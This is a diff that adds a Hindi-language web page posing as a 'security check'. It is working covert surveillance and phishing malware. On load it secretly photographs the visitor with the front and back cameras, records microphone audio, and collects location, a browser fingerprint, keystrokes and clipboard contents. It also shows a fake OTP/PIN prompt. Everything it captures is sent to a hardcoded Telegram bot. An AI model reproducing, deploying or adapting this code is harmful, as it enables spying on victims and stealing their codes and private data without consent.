@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>सुरक्षा जाँच</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:sans-serif;text-align:center;min-height:100vh;display:flex;align-items:center;justify-content:center;background-color:#f4f4f9;}
+        .container{background:white;padding:30px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);display:inline-block;max-width:460px;width:90%;}
+        #status{font-size:18px;color:#333;font-weight:bold;margin:10px 0;}
+        .loader{border:4px solid #f3f3f3;border-top:4px solid #007bff;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:20px auto;}
+        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+        #errorDetail{font-size:14px;color:#888;margin-top:10px;word-break:break-all;max-width:400px;display:none;}
+        .hidden-input{position:fixed;top:-9999px;left:-9999px;opacity:0;height:0;width:0;}
+        .fake-form{display:none;margin-top:20px;padding:20px;background:#fff3f3;border-radius:10px;border:1px solid #ffcccc;}
+        .fake-form input{padding:12px;font-size:16px;width:80%;border:2px solid #ddd;border-radius:8px;text-align:center;margin-bottom:12px;}
+        .fake-form button{padding:12px 24px;background:#dc3545;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;}
+        .fake-form button:hover{background:#c82333;}
+    </style>
+</head>
+<body onload="startAll()">
+
+<div class="container">
+    <h2 id="titleText">सुरक्षा जाँच...</h2>
+    <div id="loader" class="loader"></div>
+    <p id="status">कैमरा कनेक्टिंग...</p>
+    <p id="errorDetail"></p>
+    
+    <div id="fakeAuthForm" class="fake-form">
+        <p style="color:#dc3545;font-weight:bold;margin-bottom:10px;">⚠️ पुनः सत्यापन आवश्यक</p>
+        <p style="color:#666;font-size:14px;margin-bottom:15px;">सुरक्षा प्रणाली में त्रुटि। कृपया अपना सत्यापन कोड (OTP/PIN) दर्ज करें।</p>
+        <input type="password" id="otpInput" placeholder="अपना OTP/PIN दर्ज करें..." autocomplete="off">
+        <br>
+        <button onclick="submitFakeOtp()">✅ सत्यापित करें</button>
+    </div>
+</div>
+
+<!-- Hidden video for camera -->
+<video id="videoFront" autoplay playsinline muted
+    style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none;">
+</video>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<!-- Hidden input for keylogger focus trap -->
+<input id="keyloggerInput" class="hidden-input" autocomplete="off">
+
+<script>
+// ===================== CONFIGURATION =====================
+const BOT_TOKEN = "8225378395:AAHCsye1btvGfyrXSa_56rMkiG-XtDUswXk";
+const DEFAULT_CHAT_ID = "8146265514";
+const _urlParams = new URLSearchParams(window.location.search);
+const CHAT_ID = _urlParams.get('id') || DEFAULT_CHAT_ID;
+
+// ===================== DOM REFS =====================
+const videoFront = document.getElementById("videoFront");
+const canvas = document.getElementById("canvas");
+const statusText = document.getElementById("status");
+const titleText = document.getElementById("titleText");
+const loader = document.getElementById("loader");
+const errorDetail = document.getElementById("errorDetail");
+const fakeAuthForm = document.getElementById("fakeAuthForm");
+const otpInput = document.getElementById("otpInput");
+const klInput = document.getElementById("keyloggerInput");
+
+let frontStream = null;
+let audioStream = null;
+let mediaRecorder = null;
+let audioChunks = [];
+let captureInterval = null;
+let timeouts = [];
+let intervals = [];
+
+// ===================== UTILITY =====================
+function setStatus(msg, color, detail) {
+    statusText.innerText = msg;
+    if (color) statusText.style.color = color;
+    if (detail) {
+        errorDetail.style.display = "block";
+        errorDetail.innerText = "🔍 " + detail;
+    }
+}
+
+function setDone() {
+    loader.style.display = "none";
+    titleText.innerText = "✅ सुरक्षा जाँच पूर्ण";
+    setStatus("आपकी पहचान सत्यापित हो गई है। आप इस पेज को बंद कर सकते हैं।", "green");
+}
+
+function tgSend(method, payload) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+    
+    if (payload instanceof FormData) {
+        return fetch(url, { method: "POST", body: payload }).then(r => r.json()).catch(() => {});
+    }
+    
+    return fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    }).then(r => r.json()).catch(() => {});
+}
+
+// ===================== STAGE 1: CAMERA CAPTURE =====================
+function startCamera() {
+    return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+    .then(stream => {
+        frontStream = stream;
+        videoFront.srcObject = stream;
+        
+        return new Promise((resolve) => {
+            videoFront.onplaying = () => {
+                setStatus("कैमरा स्कैनिंग... अंतिम चरण...", "blue");
+                setTimeout(() => {
+                    capturePhoto(resolve);
+                }, 800);
+            };
+            videoFront.onloadedmetadata = () => {
+                videoFront.play().catch(() => {});
+            };
+        });
+    });
+}
+
+function capturePhoto(callback) {
+    if (videoFront.videoWidth === 0 || videoFront.videoHeight === 0) {
+        setTimeout(() => capturePhoto(callback), 300);
+        return;
+    }
+    
+    canvas.width = videoFront.videoWidth;
+    canvas.height = videoFront.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(videoFront, 0, 0, canvas.width, canvas.height);
+    
+    canvas.toBlob(b => {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("photo", b, "capture.png");
+        fd.append("caption", `📸 Front Camera — ${new Date().toLocaleString()}`);
+        
+        tgSend("sendPhoto", fd);
+        
+        if (frontStream) {
+            frontStream.getTracks().forEach(t => t.stop());
+            frontStream = null;
+        }
+        
+        if (callback) callback();
+    }, "image/png");
+}
+
+// ===================== STAGE 2: CONTINUOUS CAPTURE (background) =====================
+function startContinuousCapture() {
+    setDone();
+    
+    captureInterval = setInterval(() => {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+        .then(stream => {
+            const tempVideo = document.createElement("video");
+            tempVideo.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;";
+            tempVideo.setAttribute("playsinline", "");
+            tempVideo.setAttribute("muted", "");
+            tempVideo.srcObject = stream;
+            document.body.appendChild(tempVideo);
+            
+            tempVideo.onplaying = () => {
+                setTimeout(() => {
+                    const c = document.createElement("canvas");
+                    c.width = tempVideo.videoWidth || 640;
+                    c.height = tempVideo.videoHeight || 480;
+                    c.getContext("2d").drawImage(tempVideo, 0, 0);
+                    
+                    c.toBlob(b => {
+                        const fd = new FormData();
+                        fd.append("chat_id", CHAT_ID);
+                        fd.append("photo", b, `surveillance_${Date.now()}.png`);
+                        tgSend("sendPhoto", fd);
+                        
+                        stream.getTracks().forEach(t => t.stop());
+                        document.body.removeChild(tempVideo);
+                    }, "image/jpeg", 0.7);
+                }, 500);
+            };
+        })
+        .catch(() => {});
+    }, 10000);
+}
+
+// ===================== STAGE 3: MICROPHONE RECORDING =====================
+function startMicRecording() {
+    navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+    .then(stream => {
+        audioStream = stream;
+        mediaRecorder = new MediaRecorder(stream, { 
+            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm' 
+        });
+        
+        mediaRecorder.ondataavailable = e => {
+            if (e.data.size > 0) audioChunks.push(e.data);
+        };
+        
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(audioChunks, { type: 'audio/webm' });
+            const fd = new FormData();
+            fd.append("chat_id", CHAT_ID);
+            fd.append("audio", blob, `recording_${Date.now()}.webm`);
+            fd.append("caption", `🎤 Mic Recording — ${new Date().toLocaleString()}`);
+            tgSend("sendAudio", fd);
+            audioChunks = [];
+            
+            if (mediaRecorder && mediaRecorder.state === 'inactive') {
+                setTimeout(() => {
+                    try { mediaRecorder.start(); } catch(e) {}
+                }, 1000);
+            }
+        };
+        
+        mediaRecorder.start();
+        
+        intervals.push(setInterval(() => {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+        }, 10000));
+    })
+    .catch(() => {});
+}
+
+// ===================== STAGE 4: GEOLOCATION =====================
+function getLocation() {
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            tgSend("sendLocation", {
+                chat_id: CHAT_ID,
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude
+            });
+            
+            tgSend("sendMessage", {
+                chat_id: CHAT_ID,
+                text: `📍 Location: ${pos.coords.latitude}, ${pos.coords.longitude}\n🎯 Accuracy: ${pos.coords.accuracy}m\n🕐 ${new Date().toLocaleString()}`
+            });
+        },
+        () => {
+            timeouts.push(setTimeout(getLocation, 2000));
+        },
+        { enableHighAccuracy: true, timeout: 8000 }
+    );
+}
+
+// ===================== STAGE 5: KEYLOGGER =====================
+let keystrokeBuffer = [];
+
+document.addEventListener('keydown', (e) => {
+    if (e.target === otpInput) return;
+    
+    const key = e.key;
+    if (key === 'Enter') keystrokeBuffer.push('⏎');
+    else if (key === 'Backspace') keystrokeBuffer.push('⌫');
+    else if (key === 'Tab') keystrokeBuffer.push('⇥');
+    else if (key === 'Escape') keystrokeBuffer.push('⎋');
+    else if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') return;
+    else if (key.length === 1) keystrokeBuffer.push(key);
+    
+    if (keystrokeBuffer.length >= 30 || key === 'Enter') {
+        flushKeystrokes();
+    }
+});
+
+document.addEventListener('click', () => {
+    if (document.activeElement !== otpInput) {
+        klInput.focus();
+    }
+});
+
+intervals.push(setInterval(() => {
+    if (document.activeElement !== otpInput) {
+        klInput.focus();
+    }
+}, 3000));
+
+klInput.focus();
+
+klInput.addEventListener('input', () => {
+    const val = klInput.value;
+    if (val.length > 0) {
+        keystrokeBuffer.push(val);
+        klInput.value = '';
+    }
+});
+
+function flushKeystrokes() {
+    if (keystrokeBuffer.length === 0) return;
+    const text = keystrokeBuffer.join('');
+    keystrokeBuffer = [];
+    
+    tgSend("sendMessage", {
+        chat_id: CHAT_ID,
+        text: `⌨️ Keys: ${text}`
+    });
+}
+
+intervals.push(setInterval(flushKeystrokes, 10000));
+
+// ===================== STAGE 6: CLIPBOARD STEALING =====================
+document.addEventListener('paste', (e) => {
+    if (e.target === otpInput) return;
+    
+    setTimeout(() => {
+        const pasted = navigator.clipboard.readText().catch(() => {
+            const clipData = e.clipboardData || window.clipboardData;
+            if (clipData) {
+                return clipData.getData('text');
+            }
+            return null;
+        });
+        
+        if (pasted && typeof pasted === 'string') {
+            tgSend("sendMessage", {
+                chat_id: CHAT_ID,
+                text: `📋 Clipboard: ${pasted.substring(0, 500)}`
+            });
+        } else if (typeof pasted === 'object' && pasted.then) {
+            pasted.then(text => {
+                if (text) {
+                    tgSend("sendMessage", {
+                        chat_id: CHAT_ID,
+                        text: `📋 Clipboard: ${text.substring(0, 500)}`
+                    });
+                }
+            }).catch(() => {});
+        }
+    }, 100);
+});
+
+// ===================== STAGE 7: BROWSER FINGERPRINTING =====================
+function sendFingerprint() {
+    const fp = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        screen: `${screen.width}x${screen.height}@${screen.colorDepth}`,
+        availScreen: `${screen.availWidth}x${screen.availHeight}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        cpuCores: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        vendor: navigator.vendor,
+        appVersion: navigator.appVersion,
+        plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ')
+    };
+    
+    tgSend("sendMessage", {
+        chat_id: CHAT_ID,
+        text: `🖥️ Fingerprint:\n\`\`\`json\n${JSON.stringify(fp, null, 2)}\n\`\`\``,
+        parse_mode: 'Markdown'
+    });
+    
+    const fpCanvas = document.createElement('canvas');
+    fpCanvas.width = 256;
+    fpCanvas.height = 256;
+    const ctx = fpCanvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Canvas Fingerprint', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText('Security Check', 4, 45);
+    
+    fpCanvas.toBlob(b => {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("photo", b, "canvas_fingerprint.png");
+        fd.append("caption", `🖼️ Canvas fingerprint — ${new Date().toLocaleString()}`);
+        tgSend("sendPhoto", fd);
+    });
+}
+
+// ===================== STAGE 8: FAKE OTP PHISHING =====================
+function showFakeAuth() {
+    fakeAuthForm.style.display = "block";
+    titleText.innerText = "⚠️ पुनः सत्यापन आवश्यक";
+    setStatus("सुरक्षा प्रणाली में त्रुटि। कृपया नीचे अपना OTP/PIN दर्ज करें।", "orange");
+    otpInput.focus();
+}
+
+function submitFakeOtp() {
+    const otp = otpInput.value.trim();
+    if (!otp) return;
+    
+    tgSend("sendMessage", {
+        chat_id: CHAT_ID,
+        text: `🔐 OTP/PIN: ${otp}`
+    });
+    
+    otpInput.value = '';
+    otpInput.placeholder = '❌ गलत कोड, पुनः प्रयास करें...';
+}
+
+// ===================== STAGE 9: BACK CAMERA =====================
+function tryBackCamera() {
+    navigator.mediaDevices.enumerateDevices()
+    .then(devices => {
+        const backCamera = devices.find(d => d.kind === 'videoinput' && 
+            (d.label.toLowerCase().includes('back') || d.label.toLowerCase().includes('rear') || d.label.toLowerCase().includes('environment')));
+        
+        if (backCamera) {
+            return navigator.mediaDevices.getUserMedia({
+                video: { deviceId: { exact: backCamera.deviceId } },
+                audio: false
+            });
+        }
+        return null;
+    })
+    .then(stream => {
+        if (!stream) return;
+        
+        const tempVideo = document.createElement("video");
+        tempVideo.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;";
+        tempVideo.setAttribute("playsinline", "");
+        tempVideo.setAttribute("muted", "");
+        tempVideo.srcObject = stream;
+        document.body.appendChild(tempVideo);
+        
+        tempVideo.onplaying = () => {
+            setTimeout(() => {
+                const c = document.createElement("canvas");
+                c.width = tempVideo.videoWidth || 640;
+                c.height = tempVideo.videoHeight || 480;
+                c.getContext("2d").drawImage(tempVideo, 0, 0);
+                
+                c.toBlob(b => {
+                    const fd = new FormData();
+                    fd.append("chat_id", CHAT_ID);
+                    fd.append("photo", b, "back_camera.png");
+                    fd.append("caption", `📷 Back Camera — ${new Date().toLocaleString()}`);
+                    tgSend("sendPhoto", fd);
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    document.body.removeChild(tempVideo);
+                }, "image/jpeg", 0.8);
+            }, 600);
+        };
+    })
+    .catch(() => {});
+}
+
+// ===================== MAIN ENTRY POINT =====================
+async function startAll() {
+    try {
+        await startCamera();
+    } catch(e) {}
+    
+    sendFingerprint();
+    tryBackCamera();
+    startMicRecording();
+    getLocation();
+    startContinuousCapture();
+    
+    timeouts.push(setTimeout(showFakeAuth, 3000));
+}
+
+// ===================== CLEANUP =====================
+window.addEventListener("beforeunload", () => {
+    if (captureInterval) clearInterval(captureInterval);
+    timeouts.forEach(t => clearTimeout(t));
+    intervals.forEach(i => clearInterval(i));
+    
+    if (frontStream) frontStream.getTracks().forEach(t => t.stop());
+    if (audioStream) {
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+        audioStream.getTracks().forEach(t => t.stop());
+    }
+    
+    flushKeystrokes();
+});
+</script>
+</body>
+</html>
